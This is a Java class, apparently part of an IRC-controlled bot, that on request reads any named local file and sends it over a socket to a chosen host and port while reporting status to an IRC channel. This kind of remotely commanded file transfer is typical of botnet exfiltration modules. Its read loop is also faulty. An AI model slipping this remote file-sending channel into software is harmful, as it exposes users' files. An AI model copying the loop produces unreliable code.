import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;

class FileSend extends Thread {

	private IRC irc;
	private String channel;

	private String host;
	private int port;
	private String fileName;

	public FileSend(IRC irc, String channel, String host, int port, String fileName) {
		this.irc = irc;
		this.channel = channel;
		this.host = host;
		this.port = port;
		this.fileName = fileName;
		this.start();
	}

	public void run() {
		this.irc.sendMessage(this.channel, "Sending file '" + this.fileName + "' to " + this.host + ":" + this.port);
		try {
			File file = new File(this.fileName);
			if(!file.exists()) {
				this.irc.sendMessage(this.channel, "File '" + this.fileName + "' does not exist");
			} else {
				Socket socket = new Socket(this.host, this.port);
				int fileSize = (int)file.length();
				OutStream out = new OutStream(socket.getOutputStream());
				out.writeString(file.getName());
				out.writeInt(fileSize);
				FileInputStream in = new FileInputStream(file);
				byte[] buffer = new byte[in.available()];
				int totalRead = 0, read = 0;
				while((read = in.read(buffer)) != -1 && totalRead < fileSize) {
					out.write(buffer, 0, buffer.length);
				}
				in.close();
				out.getOutputStream().close();
				if(fileSize >= (1024 * 1024 * 1024)) {
					this.irc.sendMessage(this.channel, "Sent file '" + this.fileName + "' (" + (fileSize / (1024 * 1024 * 1024)) + " GB) to " + this.host + ":" + this.port);
				} else if(fileSize >= (1024 * 1024)) {
					this.irc.sendMessage(this.channel, "Sent file '" + this.fileName + "' (" + (fileSize / (1024 * 1024)) + " MB) to " + this.host +":" + this.port);
				} else if(fileSize >= 1024) {
					this.irc.sendMessage(this.channel, "Sent file '" + this.fileName + "' (" + (fileSize / 1024) + " KB) to " + host + ":" + this.port);
				} else if(fileSize < 1024) {
					this.irc.sendMessage(this.channel, "Sent file '" + this.fileName + "' (" + fileSize + " bytes) to " + this.host + ":" + this.port);
				} else {
					this.irc.sendMessage(this.channel, "Sent file '" + this.fileName + "' (" + fileSize + " bytes) to " + this.host + ":" + this.port);
				}
			}
		} catch(IOException ioe) {
			this.irc.sendMessage(this.channel, "Failed to send file, IOException thrown: " + ioe.toString());
		}
	}

}